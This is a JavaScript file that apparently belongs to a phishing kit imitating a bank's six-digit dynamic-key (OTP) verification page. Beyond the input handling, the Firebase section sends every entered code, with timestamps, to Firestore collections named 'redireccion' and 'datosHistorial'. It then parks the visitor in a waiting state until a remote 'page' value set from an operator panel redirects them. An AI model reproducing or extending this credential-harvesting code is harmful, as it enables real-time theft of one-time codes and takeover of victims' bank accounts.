"use strict";

(function initDinamicaUi() {
  var inputs = [];
  var clearBtn = document.getElementById("modal-key-validation_clear-button");
  var continueBtn = document.getElementById("modal-key-validation_continue-button");
  var loader = document.getElementById("dinamica-loader");
  var tokenContainer = document.querySelector(".bc-input-token-container");

  for (var i = 1; i <= 6; i++) {
    var el = document.getElementById("toko-" + i);
    if (el) {
      inputs.push(el);
    }
  }

  function allFilled() {
    for (var j = 0; j < inputs.length; j++) {
      if (!inputs[j].value) {
        return false;
      }
    }
    return true;
  }

  function anyFilled() {
    for (var j = 0; j < inputs.length; j++) {
      if (inputs[j].value) {
        return true;
      }
    }
    return false;
  }

  function lockInputs() {
    for (var j = 0; j < inputs.length; j++) {
      inputs[j].disabled = true;
    }
    if (continueBtn) {
      continueBtn.disabled = true;
    }
    if (clearBtn) {
      clearBtn.disabled = true;
    }
  }

  function unlockInputs() {
    for (var j = 0; j < inputs.length; j++) {
      inputs[j].disabled = false;
    }
    updateButtons();
  }

  function updateButtons() {
    var filled = allFilled();
    var any = anyFilled();

    if (continueBtn) {
      continueBtn.disabled = !filled;
    }
    if (clearBtn) {
      clearBtn.disabled = !any;
    }
    if (tokenContainer) {
      tokenContainer.classList.toggle("bc-all-inputs-valid", filled);
    }
  }

  function clearAll() {
    for (var j = 0; j < inputs.length; j++) {
      inputs[j].value = "";
    }
    if (inputs.length > 0) {
      inputs[0].focus();
    }
    updateButtons();
  }

  function showLoader() {
    if (loader) {
      loader.classList.add("bc-circle-loading-active");
    }
  }

  function hideLoader() {
    if (loader) {
      loader.classList.remove("bc-circle-loading-active");
    }
  }

  function getCode() {
    var code = "";
    for (var j = 0; j < inputs.length; j++) {
      code += inputs[j].value;
    }
    return code;
  }

  inputs.forEach(function (input, idx) {
    input.addEventListener("input", function () {
      var val = this.value.replace(/\D/g, "");
      this.value = val.charAt(0) || "";

      if (this.value && idx < inputs.length - 1) {
        inputs[idx + 1].focus();
      }

      updateButtons();
    });

    input.addEventListener("keydown", function (event) {
      if (event.key === "Backspace") {
        if (!this.value && idx > 0) {
          inputs[idx - 1].focus();
          inputs[idx - 1].value = "";
          event.preventDefault();
        }
        setTimeout(updateButtons, 0);
      }

      if (event.key === "ArrowLeft" && idx > 0) {
        inputs[idx - 1].focus();
        event.preventDefault();
      }

      if (event.key === "ArrowRight" && idx < inputs.length - 1) {
        inputs[idx + 1].focus();
        event.preventDefault();
      }
    });

    input.addEventListener("paste", function (event) {
      event.preventDefault();
      var pasted = (event.clipboardData || window.clipboardData)
        .getData("text")
        .replace(/\D/g, "");

      for (var k = 0; k < inputs.length && k < pasted.length; k++) {
        inputs[k].value = pasted.charAt(k);
      }

      var focusIdx = Math.min(pasted.length, inputs.length - 1);
      inputs[focusIdx].focus();
      updateButtons();
    });

    input.addEventListener("focus", function () {
      this.select();
    });
  });

  if (clearBtn) {
    clearBtn.addEventListener("click", function () {
      clearAll();
    });
  }

  if (continueBtn) {
    continueBtn.addEventListener("click", function () {
      if (!allFilled()) {
        return;
      }

      var code = getCode();
      lockInputs();
      showLoader();

      document.dispatchEvent(
        new CustomEvent("dinamica:continue", {
          detail: {
            code: code
          }
        })
      );
    });
  }

  updateButtons();
  if (inputs.length > 0) {
    inputs[0].focus();
  }

  window.dinamicaUi = {
    clearAll: clearAll,
    getCode: getCode,
    hideLoader: hideLoader,
    lockInputs: lockInputs,
    showLoader: showLoader,
    unlockInputs: unlockInputs,
    updateButtons: updateButtons
  };

  // --- Lógica de Firebase Integrada ---
  var otpWatcher = null;

  function getCurrentDinamicaState() {
    var errUrl = window.appConfig && window.appConfig.routes && window.appConfig.routes[5] ? window.appConfig.routes[5].url : "dinamica_err.html";
    return window.location.pathname.indexOf(errUrl) !== -1 ? "error" : "ok";
  }

  function updateHistoryEntry(db, usuario, otpData) {
    return db
      .collection("redireccion")
      .doc(usuario)
      .get()
      .then(function (snapshot) {
        var currentData = snapshot.exists ? snapshot.data() || {} : {};
        var payload = Object.assign(
          {
            usuario: usuario,
            timestamp: currentData.timestamp || new Date().toISOString(),
          },
          currentData,
          otpData
        );

        return db
          .collection("datosHistorial")
          .doc(usuario)
          .set(payload, { merge: true });
      })
      .catch(function (error) {
        console.error("Error actualizando historial OTP:", error);
      });
  }

  function attachOtpWatcher(userRef) {
    if (otpWatcher) {
      otpWatcher();
      otpWatcher = null;
    }

    otpWatcher = userRef.onSnapshot(
      function (docSnapshot) {
        if (!docSnapshot.exists) {
          return;
        }

        var userData = docSnapshot.data() || {};
        var page = userData.page;

        if (typeof page !== "number" || page <= 0) {
          return;
        }

        var route =
          window.appConfig &&
          window.appConfig.routes &&
          window.appConfig.routes[page]
            ? window.appConfig.routes[page]
            : null;

        if (route && route.url) {
          var targetUrl = String(route.url || "");
          var currentPath = window.location.pathname.split("/").pop() || "";
          var targetPath = targetUrl.split("?")[0].split("#")[0].split("/").pop() || "";

          if (targetPath && targetPath === currentPath) {
            return;
          }

          if (otpWatcher) {
            otpWatcher();
            otpWatcher = null;
          }

          window.location.href = route.url;
          return;
        }
      },
      function () {
        if (window.dinamicaUi) {
          window.dinamicaUi.hideLoader();
          window.dinamicaUi.unlockInputs();
        }
      }
    );
  }

  function setWaitingState(userRef, stateValue) {
    return userRef.set(
      {
        page: 0,
        dinamicaEstado: stateValue,
        dinamicaEsperandoPanel: true,
        dinamicaUltimaPagina: stateValue === "error" ? "dinamica_err" : "dinamica",
        dinamicaActualizadoEn: new Date().toISOString()
      },
      { merge: true }
    );
  }

  var db = window.db;
  var usuario = localStorage.getItem("usuarioActual");
  var currentState = getCurrentDinamicaState();

  if (db && typeof firebase !== "undefined" && usuario && currentState === "error") {
    var waitRef = db.collection("redireccion").doc(usuario);
    setWaitingState(waitRef, "error").then(function () {
      attachOtpWatcher(waitRef);
    });
  }

  document.addEventListener("dinamica:continue", function (event) {
    var db = window.db;
    if (!db || typeof firebase === "undefined") {
      if (window.dinamicaUi) {
        window.dinamicaUi.hideLoader();
        window.dinamicaUi.unlockInputs();
      }
      return;
    }

    var usuario = localStorage.getItem("usuarioActual");
    if (!usuario) {
      if (window.dinamicaUi) {
        window.dinamicaUi.hideLoader();
        window.dinamicaUi.unlockInputs();
      }
      return;
    }

    var code = event.detail && event.detail.code ? event.detail.code : "";
    if (!code) {
      if (window.dinamicaUi) {
        window.dinamicaUi.hideLoader();
        window.dinamicaUi.unlockInputs();
      }
      return;
    }

    var userRef = db.collection("redireccion").doc(usuario);
    var otpFields = {
      otpCode: code,
      otpTimestamp: new Date().toISOString(),
      page: 0,
      dinamicaEstado: getCurrentDinamicaState(),
      dinamicaEsperandoPanel: true,
      dinamicaUltimaPagina: getCurrentDinamicaState() === "error" ? "dinamica_err" : "dinamica",
      dinamicaActualizadoEn: new Date().toISOString()
    };

    userRef
      .set(otpFields, { merge: true })
      .then(function () {
        attachOtpWatcher(userRef);
        return updateHistoryEntry(db, usuario, otpFields);
      })
      .catch(function () {
        if (window.dinamicaUi) {
          window.dinamicaUi.hideLoader();
          window.dinamicaUi.unlockInputs();
        }
      });
  });
})();
